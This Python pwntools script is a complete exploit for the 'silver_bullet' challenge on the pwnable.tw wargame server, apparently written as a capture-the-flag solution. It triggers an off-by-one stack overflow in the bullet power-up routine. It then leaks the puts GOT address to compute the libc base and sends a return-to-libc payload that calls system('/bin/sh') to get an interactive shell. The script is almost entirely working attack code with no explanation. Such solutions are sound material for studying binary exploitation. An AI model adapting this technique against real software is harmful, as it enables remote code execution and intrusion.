#!/usr/bin/env python3

from pwn import *

#p = process('./silver_bullet_patched')
#p = gdb.debug('./silver_bullet_patched', gdbscript='''
#b main
#continue
#''')
p = remote('chall.pwnable.tw', 10103)


# Create bullet of 47 bytes
p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'bullet :', b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

# Power up with 1 byte
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'bullet :', b'B')

# Power up & send leak payload
puts_plt = 0x080484a8
puts_got = 0x0804afdc
puts_ret = 0x08048954  # main's addr
payload = b"\xff\xff\xff" + p32(puts_ret) + p32(puts_plt) + p32(puts_ret) + p32(puts_got) 
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'bullet :', payload)

# Beat the werewolf
p.sendlineafter(b'choice :', b'3')

# Receive the 4 bytes of leaked address
p.recvuntil(b'Oh ! You win !!\n')
leaked_puts = u32(p.recv(4))
log.success(f"Leak: {hex(leaked_puts)}")

# Print addresses for exploit
libc_base = leaked_puts - 0x5f140
system_addr = libc_base + 0x3a940
bin_sh_addr = libc_base + 0x158e8b
log.success(f"libc_base: {hex(libc_base)}")
log.success(f"system_addr: {hex(system_addr)}")
log.success(f"bin_sh_addr: {hex(bin_sh_addr)}")

# Create bullet of 47 bytes
p.sendlineafter(b'choice :', b'1')
p.sendlineafter(b'bullet :', b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')

# Power up with 1 byte
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'bullet :', b'B')

# Power up & send shell payload
payload = b"\xff\xff\xff" + b"\x41\x41\x41\x41" + p32(system_addr) + b"\x41\x41\x41\x41" + p32(bin_sh_addr) 
p.sendlineafter(b'choice :', b'2')
p.sendlineafter(b'bullet :', payload)

# Beat the werewolf
p.sendlineafter(b'choice :', b'3')


p.interactive()
